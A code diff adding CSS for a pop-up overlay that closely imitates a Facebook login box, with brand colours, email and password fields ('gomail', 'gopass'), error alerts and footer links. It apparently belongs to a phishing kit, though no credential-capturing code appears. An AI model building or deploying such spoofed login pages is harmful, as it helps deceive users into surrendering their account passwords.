@@ -1,0 +1,370 @@
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
+.go-fb-mask[_go-mask-facebook] {
+    font-family: 'Roboto', sans-serif;
+	position: fixed;
+	left: 0;
+	top: 0;
+	width: 100%;
+	height: 100%;
+	background: rgb(0 0 0 / 25%);
+	background: #00000040;
+	display: flex;
+	flex-direction: row;
+	flex-wrap: nowrap;
+	align-content: center;
+	justify-content: center;
+	align-items: center;
+}
+.col-box-fb[_go-box-facebook] {
+	background: #eceff5;
+	max-width: 400px;
+	width: 90vw;
+	position: relative;
+	border-radius: 5px;
+	display: flex;
+	flex-direction: column;
+	flex-wrap: nowrap;
+	align-items: center;
+}
+.go-cl-fb[_go-close-facebook] {
+        position: absolute;
+    right: -10px;
+    top: -10px;
+    font-size: 20px;
+    border-radius: 100%;
+    border: 1.5px solid #fff;
+    height: 20px;
+    width: 20px;
+    display: grid;
+    background: #000;
+    align-content: center;
+    align-items: center;
+    text-align: center;
+    justify-content: center;
+    line-height: 1;
+    color: #fff;
+}
+.go-content-fb[_go-content-facebook] {
+        display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    width: 100%;
+}
+.go-head-fb[_go-header-facebook] {
+        width: 100%;
+    text-align: center;
+    padding: 5px 0px;
+    background: #3b5998;
+    border-radius: 5px 5px 0px 0px;
+}
+.go-head-fb[_go-header-facebook]>img {
+        height: 30px;
+}
+.go-alert-fb-gomail[_go-alert-facebook-gomail],
+.go-alert-fb-gopass[_go-alert-facebook-gopass] {
+        width: 100%;
+    padding: 3px 10px;
+    background: #fa3e3e;
+    color: #fff;
+    font-size: 13px;
+    text-align: left;
+    display: none;
+}
+.go-alert-fb-gomail[_go-alert-facebook-gomail]>b,
+.go-alert-fb-gopass[_go-alert-facebook-gopass]>b{
+        cursor: pointer;
+}
+.go-box-fb-form[_go-box-facebook-form] {
+        width: 90%;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+.go-connect-fb[_go-connect-facebook] {
+        display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    padding: 38px 0px;
+    padding-bottom: 20px;
+}
+.go-connect-fb[_go-connect-facebook]>img {
+        width: 60px;
+    height: 60px;
+    border-radius: 12px;
+    margin-bottom: 16px;
+}
+.go-connect-fb[_go-connect-facebook]>p {
+        font-size: 16px;
+    line-height: 20px;
+    color: #90949c;
+    text-align: center;
+    width: 85%;
+}
+.go-fb-form[go-facebook-form] {
+        width: 100%;
+    text-align: center;
+}
+.go-input-box-fb[_go-input-box-facebook] {
+        width: 100%;
+    position: relative;
+    background: #fff;
+    border: 0;
+    text-align: left;
+    direction: ltr;
+    -webkit-text-size-adjust: none;
+    overflow: hidden;
+    border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
+    border-radius: 4px;
+    border-style: solid;
+    border-width: 1px;
+}
+.go-input-fb-gomail[_go-input-facebook-gomail],
+.go-input-fb-gopass[_go-input-facebook-gopass] {
+        width: 100%;
+    padding: 10px;
+    font-size: 14px;
+    line-height: 16px;
+    margin: 0px;
+    background: transparent;
+    direction: ltr;
+    text-align: left;
+    border: none;
+    border-bottom: 1px solid #e5e5e5;
+    border-bottom-color: rgba(0, 0, 0, .101);
+    outline: none;
+}
+.go-input-fb-gopass[_go-input-facebook-gopass] {
+    border: 0px;
+}
+.go-gopass-fb-box[_go-gopass-facebook-box] {
+        display: flex;
+    width: 100%;
+    flex-direction: row;
+    position: relative;
+}
+.go-gopass-fb-box[_go-gopass-facebook-box]>button {
+        text-align: center;
+    border: 1px solid transparent;
+    cursor: pointer;
+    line-height: 18px;
+    font-weight: 600;
+    font-family: 'Roboto', sans-serif;
+    text-transform: uppercase;
+    padding-left: 12px;
+    padding-right: 12px;
+    border-radius: 0px 0px 4px 0px;
+    color: #3578e5;
+    font-size: 13px;
+    outline: none;
+}
+.go-gopass-fb-box[_go-gopass-facebook-box]>i {
+        position: absolute;
+    right: 20px;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    font-size: 20px;
+}
+.go-btn-fb[_go-button-facebook] {
+        border: none;
+    border-radius: 3px;
+    box-sizing: border-box;
+    position: relative;
+    -webkit-user-select: none;
+    z-index: 0;
+    text-shadow: 0 -1px rgba(0, 0, 0, .25);
+    display: block;
+    width: 100%;
+    height: 33px;
+    padding: 0 16px;
+    color: #fff;
+    cursor: pointer;
+    font-family: 'Roboto', sans-serif;
+    font-size: 14px;
+    text-align: center;
+    background-color: #1877f2;
+    background-image: none;
+    line-height: 20px;
+    margin-top: 10px;
+    border-color: rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26);
+    box-shadow: 0 1px 0 rgba(0, 0, 0, .14), inset 0 -1px 1px 0 rgba(0, 0, 0, .03);
+}
+.go-fb-option[_go-facebook-option] {
+        text-align: center;
+    margin-top: 12px;
+    font-size: 12px;
+    width: 100%;
+}
+.go-fb-option-blue[_go-facebook-option-blue] {
+        margin: 0;
+    -webkit-text-size-adjust: none;
+    cursor: pointer;
+    color: #216fdb;
+    font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+    font-size: 12px;
+    line-height: 14px;
+    margin-bottom: 30px;
+}
+.go-fb-option-grey[_go-facebook-option-grey] {
+        margin-top: 10px;
+    text-align: center;
+    color: #576b95;
+    cursor: pointer;
+    text-decoration: none;
+    margin-bottom: 10px;
+}
+.go-fb-option-opacity[_go-facebook-option-opacity] {
+        padding-bottom: 15px;
+    text-align: center;
+    color: #7596c8;
+    font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+    font-size: 12px;
+    line-height: 14px;
+}
+.go-lang-fb[_go-language-facebook] {
+        width: 85%;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    justify-content: space-between;
+    align-items: flex-start;
+    font-size: 12px;
+    line-height: 16px;
+    margin-top: 25px;
+    padding: 8px;
+}
+.go-group-lang-fb[_go-grouping-language-facebook] {
+        text-align: center;
+}
+.go-group-lang-fb[_go-grouping-language-facebook]>i {
+        cursor: pointer;
+    text-decoration: none;
+    border: 1px solid #3b5998;
+    border-radius: 3px;
+    color: #576b95;
+    height: 18px;
+    line-height: 17px;
+    vertical-align: middle;
+    width: 18px;
+    margin: auto;
+    margin-top: 1px;
+    text-align: center;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-content: center;
+    justify-content: center;
+    align-items: center;
+}
+.go-lang-active-fb[_go-language-active-facebook] {
+        font-weight: bold;
+    color: #90949c;
+    cursor: pointer;
+}
+.go-lang-unactive-fb[_go-language-unactivate-facebook] {
+        color: #576b95;
+    cursor: pointer;
+    text-decoration: none;
+}
+.go-copy-fb[_go-copyright-facebook] {
+       font-size: 12px;
+    line-height: 15px;
+    color: gray;
+    margin-bottom: 12px; 
+}
+
+@media only screen and (max-width: 600px) {
+    .go-input-fb-gomail[_go-input-facebook-gomail], .go-input-fb-gopass[_go-input-facebook-gopass] {
+        padding: 12px;
+    font-size: 14px;
+    line-height: 18px;
+    }
+    .go-btn-fb[_go-button-facebook] {
+        height: 36px;
+        line-height: 24px;
+        margin-top: 12px;
+    }
+    .go-fb-option[_go-facebook-option] {
+        margin-top: 15px;
+    font-size: 14px;
+    }
+    .go-fb-option-blue[_go-facebook-option-blue] {
+        font-size: 14px;
+    line-height: 16px;
+    margin-bottom: 40px;
+    }
+    .go-fb-option-opacity[_go-facebook-option-opacity] {
+        padding-bottom: 36px;
+        font-size: 14px;
+    line-height: 16px;
+    }
+    .go-lang-fb[_go-language-facebook] {
+        margin-top: 24px;
+    }
+}
+@media only screen and (max-width: 361px) {
+    .go-head-fb[_go-header-facebook]>img {
+            height: 27px;
+    }
+    .go-alert-fb-gomail[_go-alert-facebook-gomail], .go-alert-fb-gopass[_go-alert-facebook-gopass] {
+        font-size: 12px;
+    }
+    .go-connect-fb[_go-connect-facebook]>img {
+        width: 55px;
+    height: 55px;
+    }
+    .go-connect-fb[_go-connect-facebook] {
+        padding: 34px 0px;
+    padding-bottom: 18px;
+    }
+    .go-connect-fb[_go-connect-facebook]>p {
+        font-size: 14px;
+    line-height: 18px;
+    }
+    .go-input-fb-gomail[_go-input-facebook-gomail], .go-input-fb-gopass[_go-input-facebook-gopass] {
+            padding: 11px;
+    font-size: 13px;
+    line-height: 17px;
+    }
+    .go-gopass-fb-box[_go-gopass-facebook-box]>button {
+        font-size: 12px;
+    }
+    .go-btn-fb[_go-button-facebook] {
+            height: 34px;
+    line-height: 24px;
+    margin-top: 10px;
+    }
+    .go-fb-option[_go-facebook-option] {
+            margin-top: 13px;
+    font-size: 12px;
+    }
+    .go-fb-option-blue[_go-facebook-option-blue] {
+            font-size: 12px;
+    line-height: 14px;
+    margin-bottom: 29px;
+    }
+    .go-fb-option-grey[_go-facebook-option-grey] {
+        margin-top: 5px;
+        margin-bottom: 10px;
+    }
+    .go-fb-option-opacity[_go-facebook-option-opacity] {
+            padding-bottom: 20px;
+    font-size: 12px;
+    line-height: 14px;
+    }
+    .go-lang-fb[_go-language-facebook] {
+            margin-top: 22px;
+            font-size: 10px;
+    line-height: 15px;
+    padding: 6px;
+    }
+    .go-copy-fb[_go-copyright-facebook] {
+            font-size: 10px;
+    line-height: 13px;
+    margin-bottom: 8px;
+    }
+}
